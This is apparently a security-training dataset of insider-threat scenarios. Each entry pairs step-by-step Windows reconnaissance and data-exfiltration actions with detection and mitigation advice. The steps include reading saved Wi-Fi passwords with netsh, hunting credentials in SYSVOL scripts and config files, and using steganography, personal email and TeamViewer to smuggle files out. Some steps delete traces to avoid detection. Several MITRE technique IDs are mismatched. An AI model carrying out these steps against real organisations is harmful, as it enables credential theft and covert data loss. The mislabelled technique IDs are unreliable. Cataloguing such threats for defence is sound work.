## Identifying Connected Drives & USBs

- **Attack Type**: Hardware Recon
- **Target**: Workstation
- **Vulnerability**: No DLP or USB restrictions
- **MITRE**: T1123 - Peripheral Device Discovery
- **Impact**: File exfiltration risk
- **Tools**: File Explorer, CMD
- **Scenario**: Insider checks what drives are mounted or connected to the system to locate removable devices or external shares.
- **Attack Steps**: Step 1: Open File Explorer. Step 2: Look under This PC for all drives (C:, D:, etc.). Step 3: Plug in USB and see if a new drive appears. Step 4: Open each drive to see file contents. Step 5: If in CMD, type wmic logicaldisk get name, description to list all drives.
- **Detection**: USB usage logs, DLP
- **Solution**: Disable USB ports, encrypt endpoints
- **Tags**: usb-recon, hardware-map

## Discovering Printers with net view

- **Attack Type**: Device Enumeration
- **Target**: Network
- **Vulnerability**: SMB enumeration allowed
- **MITRE**: T1135 - Network Share Discovery
- **Impact**: Discovery of sensitive devices
- **Tools**: CMD
- **Scenario**: Insider uses the net view command to list all visible network devices including shared printers and servers.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type net view and press Enter. Step 3: See list of devices on the domain (e.g., \\HR-PRINT, \\FINANCE-SERVER). Step 4: Try connecting to those devices using \\device\share.
- **Detection**: SMB logs, SIEM alerts
- **Solution**: Restrict net view, segment networks
- **Tags**: net-view, smb-discovery

## Accessing Group Policy Files from SYSVOL

- **Attack Type**: Policy Recon
- **Target**: AD SYSVOL Share
- **Vulnerability**: GPOs with exposed credentials
- **MITRE**: T1482 - Domain Trust Discovery
- **Impact**: Credential leaks via scripts
- **Tools**: File Explorer, CMD
- **Scenario**: Insider browses the SYSVOL share to access scripts and GPOs that might contain usernames, mapped drives, or credentials.
- **Attack Steps**: Step 1: Press Win + R, type \\domaincontroller\SYSVOL and hit Enter. Step 2: Open folders like Policies, Scripts, or Logon. Step 3: Look for .bat, .vbs, or .ps1 files. Step 4: Open scripts to see hardcoded credentials or drive mappings.
- **Detection**: SYSVOL auditing
- **Solution**: Use encrypted vaults, remove hardcoded creds
- **Tags**: gpo, sysvol, recon

## Viewing Host File to Find Internal DNS Overrides

- **Attack Type**: DNS Recon
- **Target**: Endpoint
- **Vulnerability**: Exposed custom DNS mappings
- **MITRE**: T1016 - Local Network Configuration Discovery
- **Impact**: Bypass of normal DNS
- **Tools**: Notepad
- **Scenario**: Insider opens the hosts file to see manually defined IP addresses that bypass DNS, revealing internal services.
- **Attack Steps**: Step 1: Go to C:\Windows\System32\drivers\etc. Step 2: Right-click hosts file → Open with Notepad. Step 3: Read entries like 192.168.1.25 intranet.company.local. Step 4: Use browser to visit those hidden services.
- **Detection**: File access monitoring
- **Solution**: Protect hosts file with admin rights
- **Tags**: dns-recon, hosts-file

## Finding Scheduled Tasks via Task Scheduler

- **Attack Type**: Task Recon
- **Target**: Workstation / Server
- **Vulnerability**: Misconfigured scheduled tasks
- **MITRE**: T1053 - Scheduled Task
- **Impact**: Exposure of automation logic or credentials
- **Tools**: Task Scheduler
- **Scenario**: Insider browses scheduled tasks to learn about scripts or tools running regularly, possibly exposing credentials or data movement.
- **Attack Steps**: Step 1: Press Windows + R, type taskschd.msc and hit Enter. Step 2: Expand Task Scheduler Library. Step 3: Click through each task and view the Actions tab. Step 4: Look for scripts or commands being run. Step 5: Copy any file paths or credentials used.
- **Detection**: Endpoint task logs
- **Solution**: Avoid hardcoding credentials, secure scripts
- **Tags**: task-scheduler, credential-leak

## Browsing Browser History for Admin Portals

- **Attack Type**: Passive Recon
- **Target**: Browser
- **Vulnerability**: No browser data clearing policy
- **MITRE**: T1213.003 - Data from Browser
- **Impact**: Discovery of sensitive internal URLs
- **Tools**: Chrome / Firefox
- **Scenario**: Insider reviews browser history to find visited admin or management web pages.
- **Attack Steps**: Step 1: Open browser. Step 2: Press Ctrl+H to open History. Step 3: Look for URLs with keywords like admin, dashboard, vpn, firewall. Step 4: Attempt to re-visit the URLs to check access.
- **Detection**: Browser audit tools
- **Solution**: Auto-clear browsing history or disable caching
- **Tags**: browser-history, passive-recon

## Discovering Wireless Config Files

- **Attack Type**: Wireless Recon
- **Target**: Endpoint
- **Vulnerability**: Plaintext Wi-Fi passwords
- **MITRE**: T1552.004 - Wi-Fi Config Discovery
- **Impact**: Leak of internal wireless access
- **Tools**: File Explorer
- **Scenario**: Employee opens saved wireless config files to extract internal Wi-Fi SSIDs and possibly passwords.
- **Attack Steps**: Step 1: Open File Explorer. Step 2: Navigate to C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\. Step 3: Look for .xml files. Step 4: Open XML in Notepad. Step 5: If Wi-Fi password is saved, it may appear in plain text or Base64.
- **Detection**: Endpoint file scanners
- **Solution**: Encrypt or block access to WLAN configs
- **Tags**: wifi-recon, wireless-pass

## Querying Network Interfaces

- **Attack Type**: Network Info Discovery
- **Target**: Endpoint
- **Vulnerability**: Interface visibility
- **MITRE**: T1016 - Network Configuration Discovery
- **Impact**: Internal network exposure
- **Tools**: CMD
- **Scenario**: Insider uses ipconfig /all to list all network interfaces and connections, learning VPNs or internal DNS.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type ipconfig /all and press Enter. Step 3: Look for sections like "Ethernet adapter", "DNS Servers", or "VPN Client". Step 4: Note down internal domains and connection settings.
- **Detection**: Endpoint monitoring
- **Solution**: Limit interface visibility, VPN obfuscation
- **Tags**: ipconfig, interface-enum

## Using net time to Discover Domain Controller

- **Attack Type**: Domain Recon
- **Target**: Domain Controller
- **Vulnerability**: No time sync restrictions
- **MITRE**: T1482 - Domain Trust Discovery
- **Impact**: Targets AD or central authentication
- **Tools**: CMD
- **Scenario**: Insider uses net time to learn which server is the domain controller, for targeting AD later.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type net time and press Enter. Step 3: Output will say something like "Current time at \DC01 is...". Step 4: Note down the domain controller's hostname/IP. Step 5: Use this to plan attacks on AD or policies.
- **Detection**: AD logs, time sync events
- **Solution**: Restrict net commands, rename DC
- **Tags**: domain-recon, net-time

## Collecting Software List from Add/Remove Programs

- **Attack Type**: Software Recon
- **Target**: Workstation
- **Vulnerability**: Software discovery allowed
- **MITRE**: T1518.001 - Application Discovery
- **Impact**: Identifies weak points in software stack
- **Tools**: Control Panel
- **Scenario**: Insider opens the system’s installed software list to learn what programs are used.
- **Attack Steps**: Step 1: Press Windows + R → type appwiz.cpl and hit Enter. Step 2: Review the list of installed applications. Step 3: Note security tools (e.g., antivirus, monitoring), VPN clients, database tools. Step 4: Take screenshots or write down application names.
- **Detection**: Application inventory tools
- **Solution**: Limit visibility; alert on sensitive installs
- **Tags**: software-list, internal-inventory

## Reading Login Events from Event Viewer

- **Attack Type**: Log Recon
- **Target**: Workstation
- **Vulnerability**: Unmonitored event access
- **MITRE**: T1005 - Data from Local System
- **Impact**: Insider watches login behavior
- **Tools**: Event Viewer
- **Scenario**: Insider checks who logged in or failed to log in by reading system event logs.
- **Attack Steps**: Step 1: Press Windows + R → type eventvwr and Enter. Step 2: Go to Windows Logs > Security. Step 3: Look for Event ID 4624 (logon) or 4625 (failed login). Step 4: Note usernames, timestamps, source IPs.
- **Detection**: SIEM, EDR monitoring
- **Solution**: Audit event viewer access
- **Tags**: event-viewer, login-history

## Finding Database Info from Config Files

- **Attack Type**: Config File Recon
- **Target**: App Server
- **Vulnerability**: Config files with sensitive info
- **MITRE**: T1552.001 - Unprotected Credentials
- **Impact**: Database login theft
- **Tools**: File Explorer, Notepad
- **Scenario**: Insider checks application folders for .ini, .env, or .config files with hardcoded DB info.
- **Attack Steps**: Step 1: Browse to folders like C:\app\, C:\inetpub\, or Desktop. Step 2: Look for files ending in .ini, .conf, .env, or .xml. Step 3: Open them in Notepad. Step 4: Search for lines like DB_USER=, PASSWORD=, or IP addresses.
- **Detection**: Endpoint DLP, config scanning
- **Solution**: Use encrypted secrets vault
- **Tags**: config-creds, db-access

## Using PowerShell to List AD Users

- **Attack Type**: Directory Recon
- **Target**: AD / Domain
- **Vulnerability**: Directory access from endpoint
- **MITRE**: T1087.002 - Domain Account
- **Impact**: Maps all user accounts
- **Tools**: PowerShell
- **Scenario**: Insider uses simple PowerShell command to list all Active Directory users.
- **Attack Steps**: Step 1: Open PowerShell. Step 2: Run Get-ADUser -Filter * (requires domain rights). Step 3: If blocked, try net user /domain. Step 4: Save usernames in a text file.
- **Detection**: PowerShell logging
- **Solution**: Restrict PowerShell usage
- **Tags**: powershell-recon, ad-user-list

## Searching Local Drives for Keyword Files

- **Attack Type**: File Discovery
- **Target**: Local System
- **Vulnerability**: No file tagging or classification
- **MITRE**: T1083 - File and Directory Discovery
- **Impact**: Unclassified file leaks
- **Tools**: File Explorer
- **Scenario**: Insider searches their PC for files containing sensitive terms like "confidential", "salary", etc.
- **Attack Steps**: Step 1: Open File Explorer. Step 2: Select This PC and use search terms: *salary*, *confidential*, *plan*. Step 3: Sort results by type or date. Step 4: Open relevant files and read or copy contents.
- **Detection**: File monitoring, DLP
- **Solution**: Classify sensitive files, disable full search
- **Tags**: file-discovery, sensitive-info

## Finding API Keys in Code Files

- **Attack Type**: Code Recon
- **Target**: Developer Machine
- **Vulnerability**: Hardcoded secrets
- **MITRE**: T1552.001 - Credentials in Code
- **Impact**: Access to external/internal services
- **Tools**: VS Code / Notepad / Search
- **Scenario**: Insider searches local project folders for code files containing keys or tokens.
- **Attack Steps**: Step 1: Navigate to dev folders like C:\Projects, Desktop\scripts. Step 2: Search for file types: .js, .py, .json. Step 3: Open in editor and search for keywords: key=, token=, auth. Step 4: Note any hardcoded API keys.
- **Detection**: Source code DLP, git hooks
- **Solution**: Store secrets in vaults, review code
- **Tags**: code-leak, apikey, dev

## Using Windows Search to Locate Remote Access Tools

- **Attack Type**: Tool Recon
- **Target**: Local System
- **Vulnerability**: Remote tools installed & logged in
- **MITRE**: T1071.001 - Application Layer Protocol
- **Impact**: Persistent access setup
- **Tools**: Windows Search
- **Scenario**: Insider uses Windows search to find remote tools like AnyDesk, TeamViewer, etc., to plan remote access.
- **Attack Steps**: Step 1: Press Start and type AnyDesk, TeamViewer, or VPN. Step 2: If found, right-click → Open File Location. Step 3: Open the tool and check connection history or ID. Step 4: Attempt to connect remotely later.
- **Detection**: DLP, remote tool blocklists
- **Solution**: Restrict installation/use of remote tools
- **Tags**: anydesk, teamviewer, persistence

## Discovering Email Headers to Reveal Internal IPs

- **Attack Type**: Email Recon
- **Target**: Mail Server
- **Vulnerability**: Visible internal routing in headers
- **MITRE**: T1114 - Email Collection
- **Impact**: Maps email routing infra
- **Tools**: Outlook / Gmail
- **Scenario**: Insider inspects email headers to discover internal mail server names and IPs.
- **Attack Steps**: Step 1: Open an internal email. Step 2: Click File → Properties (Outlook) or More → Show original (Gmail). Step 3: Review Received: lines in header. Step 4: Note internal IPs and server names.
- **Detection**: Email header inspection tools
- **Solution**: Scrub headers before sending
- **Tags**: email-header, smtp-trace

## Searching Browser Autofill for Exposed Info

- **Attack Type**: Form Data Recon
- **Target**: Browser
- **Vulnerability**: Autofill without restrictions
- **MITRE**: T1555 - Input Capture
- **Impact**: Targeted impersonation, phishing
- **Tools**: Browser Settings
- **Scenario**: Insider checks browser autofill for saved form entries like name, phone, address, etc.
- **Attack Steps**: Step 1: Open Chrome or Firefox. Step 2: Go to Settings → Autofill. Step 3: Check saved names, phone numbers, emails, addresses. Step 4: Use this to impersonate internal users.
- **Detection**: Browser privacy policies
- **Solution**: Clear autofill on logout, disable auto-save
- **Tags**: formdata, impersonation

## Using NSLookup to Discover Internal DNS Records

- **Attack Type**: DNS Recon
- **Target**: DNS Server
- **Vulnerability**: Internal DNS resolution allowed
- **MITRE**: T1016.001 - DNS Resolution Discovery
- **Impact**: Maps internal infrastructure
- **Tools**: CMD
- **Scenario**: Insider queries DNS servers to find other internal systems via hostnames.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type nslookup. Step 3: Type internal hostnames like vpn, intranet, hr. Step 4: If resolved, the internal IP is revealed.
- **Detection**: DNS logging, monitoring
- **Solution**: Limit internal DNS zone visibility
- **Tags**: nslookup, dns-mapping

## Enumerating AD Group Policy Objects via PowerShell

- **Attack Type**: GPO Recon
- **Target**: Domain Controller
- **Vulnerability**: Group policy exposure
- **MITRE**: T1482 - Domain Trust Discovery
- **Impact**: Leverage GPOs for persistence or discovery
- **Tools**: PowerShell
- **Scenario**: Insider uses PowerShell to list applied Group Policy Objects and discover scripts or settings that can be abused.
- **Attack Steps**: Step 1: Open PowerShell. Step 2: Type Get-GPO -All (requires RSAT or domain access). Step 3: Look for GPOs linked to Logon Scripts or Drive Maps. Step 4: Export names for deeper review.
- **Detection**: PowerShell logging, GPO access alerts
- **Solution**: Restrict GPO viewing to admins
- **Tags**: gpo, powershell, recon

## Token Impersonation using whoami /priv

- **Attack Type**: Privilege Recon
- **Target**: Workstation
- **Vulnerability**: Misconfigured privileges
- **MITRE**: T1134.001 - Token Impersonation
- **Impact**: Lateral movement or privilege abuse
- **Tools**: CMD
- **Scenario**: Insider checks if their session can impersonate another user by viewing token privileges.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type whoami /priv. Step 3: Check if SeImpersonatePrivilege is enabled. Step 4: If yes, prepare to use for token theft via custom tools.
- **Detection**: Privilege auditing tools
- **Solution**: Restrict impersonation to admins
- **Tags**: token-abuse, privilege-escalation

## Cloud Enumeration via GDrive Access

- **Attack Type**: Cloud Recon
- **Target**: Cloud Workspace
- **Vulnerability**: Poor folder permissions
- **MITRE**: T1087.003 - Cloud Account Discovery
- **Impact**: Cloud data leakage
- **Tools**: Google Drive
- **Scenario**: Insider logs into GDrive to browse shared internal folders and infer document structure and team hierarchies.
- **Attack Steps**: Step 1: Log into corporate GDrive. Step 2: Go to Shared with me. Step 3: Open folders and documents. Step 4: Use search bar with keywords like “admin”, “credentials”, “meeting”. Step 5: Download interesting documents.
- **Detection**: Cloud audit logs (Google Vault, etc.)
- **Solution**: Apply folder-level access controls
- **Tags**: gdrive, cloud-recon

## Accessing Registry for Autostart Programs

- **Attack Type**: Persistence Recon
- **Target**: Endpoint
- **Vulnerability**: Registry writable by standard users
- **MITRE**: T1547.001 - Registry Run Keys
- **Impact**: Persistence or monitoring bypass
- **Tools**: Regedit
- **Scenario**: Insider browses Windows registry to find autostart programs that may be modifiable.
- **Attack Steps**: Step 1: Press Win + R → type regedit. Step 2: Navigate to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. Step 3: Note entries that launch on boot. Step 4: Prepare to modify or inject custom scripts.
- **Detection**: Registry integrity tools
- **Solution**: Restrict write access to autostart keys
- **Tags**: registry, autostart, recon

## Enumerating Domain Trusts using nltest

- **Attack Type**: Domain Recon
- **Target**: Domain Controller
- **Vulnerability**: Domain trust visibility
- **MITRE**: T1482 - Domain Trust Discovery
- **Impact**: Cross-domain movement prep
- **Tools**: CMD
- **Scenario**: Insider uses nltest to identify domain trust relationships for potential lateral moves.
- **Attack Steps**: Step 1: Open CMD. Step 2: Run nltest /domain_trusts. Step 3: Review trusted domains. Step 4: Plan cross-domain access or attacks.
- **Detection**: Windows event logging
- **Solution**: Restrict nltest utility to domain admins
- **Tags**: nltest, trust-recon

## Extracting Wi-Fi Profiles using PowerShell

- **Attack Type**: Wireless Recon
- **Target**: Endpoint
- **Vulnerability**: Saved passwords stored in plaintext
- **MITRE**: T1552.004 - Wi-Fi Config Discovery
- **Impact**: Unauthorized Wi-Fi access
- **Tools**: PowerShell
- **Scenario**: Insider extracts all saved wireless profiles to find internal SSIDs and stored credentials.
- **Attack Steps**: Step 1: Open PowerShell. Step 2: Type netsh wlan show profiles. Step 3: Then use netsh wlan show profile name="SSID" key=clear. Step 4: Copy Wi-Fi password from Key Content.
- **Detection**: WLAN profile access alerts
- **Solution**: Block netsh usage, encrypt profiles
- **Tags**: wifi-profile, powershell-recon

## Inspecting Windows Services for Vulnerable Binaries

- **Attack Type**: Service Recon
- **Target**: Endpoint
- **Vulnerability**: Unprotected service binaries
- **MITRE**: T1543.003 - Windows Service
- **Impact**: Privilege escalation via services
- **Tools**: Services.msc
- **Scenario**: Insider checks installed services to identify those running with SYSTEM privileges but modifiable paths.
- **Attack Steps**: Step 1: Press Win + R → type services.msc. Step 2: Scroll and right-click → Properties on each service. Step 3: Note “Path to executable” and permissions on that folder. Step 4: If writable, attacker can replace the binary.
- **Detection**: Service install logs, file ACLs
- **Solution**: Apply permission hardening
- **Tags**: service-abuse, privilege-escalation

## Accessing C:\Windows\Panther to View Setup Logs

- **Attack Type**: System Recon
- **Target**: System
- **Vulnerability**: Logs exposed to local users
- **MITRE**: T1005 - Data from Local System
- **Impact**: Reveals sensitive install data
- **Tools**: File Explorer
- **Scenario**: Insider views Panther setup logs to identify network setup, admin accounts, and domain joins.
- **Attack Steps**: Step 1: Navigate to C:\Windows\Panther. Step 2: Open files like unattend.xml or setupact.log. Step 3: Search for domain names, admin usernames, or install flags.
- **Detection**: File system auditing
- **Solution**: Clean up install files post-deployment
- **Tags**: panther-log, setup-recon

## Using ADSI Edit for AD Enumeration

- **Attack Type**: Advanced AD Recon
- **Target**: AD Server
- **Vulnerability**: No RBAC or ADSI restriction
- **MITRE**: T1087.002 - Domain Account Discovery
- **Impact**: AD object mapping
- **Tools**: ADSI Edit
- **Scenario**: Insider uses ADSI Edit to browse LDAP/AD structure and find hidden objects.
- **Attack Steps**: Step 1: Open ADSI Edit (if available). Step 2: Connect to Default Naming Context. Step 3: Browse OU and CN folders. Step 4: Look for disabled accounts, computer objects, or service accounts.
- **Detection**: Monitor LDAP queries
- **Solution**: Disable ADSI for non-admins
- **Tags**: adsi-edit, ldap-recon

## Enumerating Internal Cert Templates via certutil

- **Attack Type**: Certificate Recon
- **Target**: CA Server
- **Vulnerability**: Misconfigured templates
- **MITRE**: T1553.004 - Abused Certificate Templates
- **Impact**: Fake certificate for impersonation
- **Tools**: CMD
- **Scenario**: Insider uses certutil to enumerate internal certificate templates that may be misconfigured.
- **Attack Steps**: Step 1: Open CMD. Step 2: Run certutil -template. Step 3: Look for templates with Enroll or Autoenroll. Step 4: Prepare to request a cert using template for privilege escalation.
- **Detection**: Cert server logs
- **Solution**: Harden certificate permissions
- **Tags**: cert-recon, pki-abuse

## USB Drive Exfiltration by Contractor

- **Attack Type**: Data Exfiltration
- **Target**: Workstation
- **Vulnerability**: Unrestricted USB port access
- **MITRE**: T1052.001 (Exfil via Removable Media)
- **Impact**: Loss of sensitive data
- **Tools**: USB Drive, File Explorer
- **Scenario**: A contractor plugs in a USB drive and copies sensitive company files during off-hours.
- **Attack Steps**: Step 1: Wait until no one is nearby (e.g., during break).Step 2: Plug in a personal USB drive into office computer.Step 3: Press Windows + E to open File Explorer.Step 4: Go to important folders like "Documents", "Shared", or "Finance".Step 5: Select and right-click "Copy" on key files (e.g., budget.xlsx).Step 6: Navigate to USB drive and right-click "Paste".Step 7: Wait for files to copy and then click "Safely Remove Hardware" to eject.Step 8: Pocket the USB and leave.
- **Detection**: DLP software, USB activity logs
- **Solution**: Disable USB ports, implement endpoint monitoring
- **Tags**: usb, removable media, physical exfil

## Cloud Sync Abuse by Employee

- **Attack Type**: Data Exfiltration
- **Target**: File Server / Workstation
- **Vulnerability**: Cloud sync clients not blocked
- **MITRE**: T1537 (Transfer Data to Cloud)
- **Impact**: Unauthorized cloud data access
- **Tools**: Google Drive App
- **Scenario**: An employee syncs sensitive files to their personal Google Drive using desktop app.
- **Attack Steps**: Step 1: Install Google Drive app on office PC (if not restricted).Step 2: Sign in using personal Gmail account.Step 3: Right-click on the Drive folder and choose “Show in Explorer”.Step 4: Drag & drop sensitive reports into the Google Drive folder.Step 5: Wait for upload (check status icon).Step 6: Log in to Google Drive from phone/laptop at home to access.
- **Detection**: Network firewall logs, CASB alerts
- **Solution**: Block cloud apps via firewall/proxy; CASB solutions
- **Tags**: cloud, sync abuse, google drive

## Screenshot Theft via Snipping Tool

- **Attack Type**: Data Exfiltration
- **Target**: Web Application
- **Vulnerability**: Lack of screenshot protection
- **MITRE**: T1115 (Clipboard Collection)
- **Impact**: Leakage of visual data
- **Tools**: Snipping Tool, Email
- **Scenario**: Insider takes screenshots of confidential dashboard using Snipping Tool and emails them out.
- **Attack Steps**: Step 1: Open the internal dashboard or sensitive page on browser.Step 2: Press Windows + Shift + S to open Snipping Tool.Step 3: Highlight the portion of the screen with private data.Step 4: Image auto-copies to clipboard — open MS Paint or Word and press Ctrl+V.Step 5: Save image as “data.png” to Desktop.Step 6: Open personal Gmail and attach the image.Step 7: Send it to external recipient.Step 8: Delete image file to avoid detection.
- **Detection**: Clipboard logging, outbound email DLP
- **Solution**: Watermarking, block snipping tools
- **Tags**: screenshot, snipping, visual theft

## File Upload via Personal Email

- **Attack Type**: Data Exfiltration
- **Target**: Workstation
- **Vulnerability**: No restriction on webmail uploads
- **MITRE**: T1048.003 (Exfil via Email)
- **Impact**: Email-based confidential data loss
- **Tools**: Web Browser, Gmail
- **Scenario**: Employee attaches sensitive documents to a draft in personal webmail and sends them outside.
- **Attack Steps**: Step 1: Open browser and log in to Gmail or ProtonMail.Step 2: Click “Compose” and attach files from Downloads folder.Step 3: Add recipient email (can be own secondary email).Step 4: Click “Send”.Step 5: Logout and delete browser history.Step 6: On personal phone or laptop, download the files.
- **Detection**: Proxy/email logs, DLP gateway alerts
- **Solution**: Block webmail uploads, restrict attachments
- **Tags**: email, gmail, file upload

## Steganography via Image Upload

- **Attack Type**: Data Exfiltration
- **Target**: File Server
- **Vulnerability**: Unmonitored outbound image upload
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Data theft in disguised media
- **Tools**: Steghide, JPEG image, Social Media
- **Scenario**: Insider hides data inside an image using steganography and uploads it to a social media account.
- **Attack Steps**: Step 1: Take any office-related image (e.g., event photo).Step 2: Use Steghide (simple GUI or command-line) to embed secret file (e.g., client_list.pdf) into image.Step 3: Save output image (looks normal).Step 4: Log in to personal Facebook/Instagram.Step 5: Upload the image with casual caption like "Great Day at Work!".Step 6: Download it at home and extract hidden file using Steghide.
- **Detection**: Stego detection tools, social media monitoring
- **Solution**: Disable external media uploads, monitor stego behavior
- **Tags**: steganography, image, covert exfil

## Print-and-Take Physical Documents

- **Attack Type**: Data Exfiltration
- **Target**: Printer, Documents
- **Vulnerability**: No printer monitoring or watermarks
- **MITRE**: T1056.001 (Input Capture - Physical Exfil)
- **Impact**: Physical breach of confidential info
- **Tools**: Printer, Excel
- **Scenario**: Employee prints out sensitive spreadsheets, hides them in bag, and walks out.
- **Attack Steps**: Step 1: Open the confidential Excel file (e.g., salary list or financial report).Step 2: Press Ctrl+P and select office printer.Step 3: Print only selected pages (e.g., Page 2-3).Step 4: Walk to printer, collect pages discreetly.Step 5: Fold papers and hide inside backpack.Step 6: Exit office like normal.
- **Detection**: Printer logs, physical security cameras
- **Solution**: Watermark printouts, limit access to printers
- **Tags**: physical, print, paper leak

## Remote Access via TeamViewer

- **Attack Type**: Data Exfiltration
- **Target**: Desktop PC
- **Vulnerability**: No restriction on remote desktop apps
- **MITRE**: T1021.001 (Remote Desktop Protocol)
- **Impact**: Unauthorized remote access
- **Tools**: TeamViewer
- **Scenario**: Insider installs TeamViewer and accesses the PC remotely at night to extract files.
- **Attack Steps**: Step 1: On office PC, install TeamViewer (from official site).Step 2: Set a custom password and note down the TeamViewer ID.Step 3: Go home and install TeamViewer on personal laptop.Step 4: At night, open TeamViewer and connect using stored ID/password.Step 5: Navigate file system remotely and transfer confidential data using drag-drop.
- **Detection**: App whitelisting, network logs, RDP monitors
- **Solution**: Block remote access tools; alert on remote sessions
- **Tags**: remote, RDP, TeamViewer

## Hidden Folder in Shared Drive

- **Attack Type**: Data Exfiltration
- **Target**: Shared Network Drive
- **Vulnerability**: Lack of audit/log on shared drives
- **MITRE**: T1074.002 (Local Data Staging)
- **Impact**: Stealthy storage and delayed exfil
- **Tools**: File Explorer
- **Scenario**: Insider creates hidden folders in shared drive and stores files for later retrieval.
- **Attack Steps**: Step 1: Open File Explorer and navigate to a shared drive folder.Step 2: Create a new folder named “.logs_temp” (prefixing with dot hides it on Linux/mac).Step 3: Move sensitive files into this folder.Step 4: Access same folder from personal laptop or when unsupervised to copy out files.Step 5: Delete folder after use.
- **Detection**: File change logs, folder permission audits
- **Solution**: Disable creation of hidden folders, monitor anomalies
- **Tags**: staging, hidden folder, network drive

## Email Draft Method

- **Attack Type**: Data Exfiltration
- **Target**: Email
- **Vulnerability**: No draft monitoring, weak browser controls
- **MITRE**: T1048.003 (Email Draft Exfiltration)
- **Impact**: Hidden transfer without network alert
- **Tools**: Gmail, Browser
- **Scenario**: Employee stores stolen data in Gmail “Drafts” and accesses it from another device.
- **Attack Steps**: Step 1: Log into personal Gmail from office PC.Step 2: Click Compose and attach secret document (but don’t send).Step 3: Save the draft and log out.Step 4: On phone/laptop at home, open same Gmail and retrieve the draft.Step 5: Download attached file privately.
- **Detection**: Browser monitoring, Gmail API auditing
- **Solution**: Block personal Gmail, monitor drafts
- **Tags**: email, draft, covert exfil

## Notepad Copy & QR Code Encode

- **Attack Type**: Data Exfiltration
- **Target**: Web Browser
- **Vulnerability**: No restriction on QR/data encoding
- **MITRE**: T1027 (Obfuscated Files or Info)
- **Impact**: Covert visual exfil via phone
- **Tools**: Notepad, QR Code Generator
- **Scenario**: Insider copies data into a QR code and scans it with a phone to extract it.
- **Attack Steps**: Step 1: Open Notepad and paste client data (e.g., names, SSNs).Step 2: Go to a free online QR code generator in browser.Step 3: Paste Notepad content and generate QR code image.Step 4: Use mobile phone QR scanner to read & save the data.Step 5: Delete Notepad and QR history from browser.
- **Detection**: Webcam or screen recording, QR code detection
- **Solution**: Limit internet tool usage, phone bans in secure area
- **Tags**: qr code, phone exfil, clipboard

## Slack File Upload to Private Channel

- **Attack Type**: Data Exfiltration
- **Target**: Slack Workspace
- **Vulnerability**: Unmonitored app uploads
- **MITRE**: T1071.001 (Application Layer Protocol - Slack)
- **Impact**: File theft via corporate chat
- **Tools**: Slack Desktop App
- **Scenario**: Insider uploads sensitive files to a private Slack channel or DM, then accesses them later.
- **Attack Steps**: Step 1: Open Slack and go to a private channel (owned by attacker).Step 2: Drag and drop confidential documents into chat.Step 3: Files upload to Slack servers.Step 4: Go home and log into same Slack account.Step 5: Download files from channel history.
- **Detection**: Slack audit logs, firewall alerts
- **Solution**: DLP on chat apps, restrict private uploads
- **Tags**: slack, chat, internal exfil

## Image-to-Text via OCR and Email

- **Attack Type**: Data Exfiltration
- **Target**: Screen or Printed Document
- **Vulnerability**: No phone restriction, OCR tools allowed
- **MITRE**: T1115 (Data from Screen)
- **Impact**: Visual data leak through photos
- **Tools**: OCR App, Camera, Gmail
- **Scenario**: Insider takes a photo of document and uses OCR to convert image into text and send via email.
- **Attack Steps**: Step 1: Use mobile phone to discreetly take photo of screen or printed doc.Step 2: Use an OCR app (like Adobe Scan or Google Lens) to convert photo into text.Step 3: Copy the text and paste into Gmail.Step 4: Send to external address.Step 5: Delete photo and email after confirmation.
- **Detection**: Phone ban in secure zones, screen capture policies
- **Solution**: Block OCR/image apps, paper restrictions
- **Tags**: OCR, visual, image to text

## File Rename with Innocent Extension

- **Attack Type**: Data Exfiltration
- **Target**: Workstation
- **Vulnerability**: No file extension monitoring
- **MITRE**: T1036.008 (Masquerading - File Extension)
- **Impact**: Evasion of content-based filters
- **Tools**: File Explorer
- **Scenario**: Insider renames .docx file as .jpg and uploads it to evade detection.
- **Attack Steps**: Step 1: Right-click confidential file (e.g., contract.docx).Step 2: Rename it to “photo123.jpg”.Step 3: Upload it to personal cloud (e.g., Dropbox, Google Drive).Step 4: Later rename it back to .docx to access.Step 5: Delete browser history and logs.
- **Detection**: File type scan, sandbox alerts
- **Solution**: DLP with content inspection, extension policy
- **Tags**: masquerade, rename, exfil

## ChatGPT or AI Tool Abuse

- **Attack Type**: Data Exfiltration
- **Target**: Web Browser
- **Vulnerability**: No AI usage policy
- **MITRE**: T1056.004 (Input Capture - Online Tool Abuse)
- **Impact**: Third-party data exposure
- **Tools**: Browser, ChatGPT
- **Scenario**: Insider pastes private data into ChatGPT or other AI tools to generate summaries or keep externally.
- **Attack Steps**: Step 1: Open browser and go to chat.openai.com.Step 2: Paste sensitive emails, contracts, etc., into the chat box.Step 3: Ask for summary or click to “Export”.Step 4: Log into same account from home to access chat history.Step 5: Delete chat if needed.
- **Detection**: Monitor AI tool access, data classifiers
- **Solution**: Restrict AI tools, train employees
- **Tags**: AI, ChatGPT, NLP abuse

## Screenshot via Smartwatch Camera

- **Attack Type**: Data Exfiltration
- **Target**: Display Screen
- **Vulnerability**: No camera ban, wearable not detected
- **MITRE**: T1115 (Capture Screen)
- **Impact**: Visual theft undetectable by software
- **Tools**: Smartwatch
- **Scenario**: Insider uses smartwatch with hidden camera to take photo of screen.
- **Attack Steps**: Step 1: Wear a smartwatch with camera (e.g., Apple Watch, Galaxy Watch).Step 2: Sit near a screen showing sensitive info.Step 3: Tap watch to take discreet photo.Step 4: Sync watch to personal phone later.Step 5: Extract image and share externally.
- **Detection**: Physical surveillance, watch bans
- **Solution**: Ban smart wearables in secure zones
- **Tags**: wearable, spycam, smartwatch

## Copy to Personal Mobile via USB

- **Attack Type**: Data Exfiltration
- **Target**: Desktop/Laptop
- **Vulnerability**: USB transfer not restricted
- **MITRE**: T1052.001 (Removable Media)
- **Impact**: Direct offline exfiltration
- **Tools**: USB Cable, File Explorer
- **Scenario**: Insider connects mobile phone via USB and transfers data directly.
- **Attack Steps**: Step 1: Connect mobile phone to office PC using a USB cable.Step 2: On the phone, select "File Transfer" mode.Step 3: Open File Explorer on PC and locate mobile device.Step 4: Copy sensitive files from "Documents" and paste them into phone storage.Step 5: Safely eject the phone and disconnect.Step 6: Access files from phone later.
- **Detection**: USB connection logs, MDM
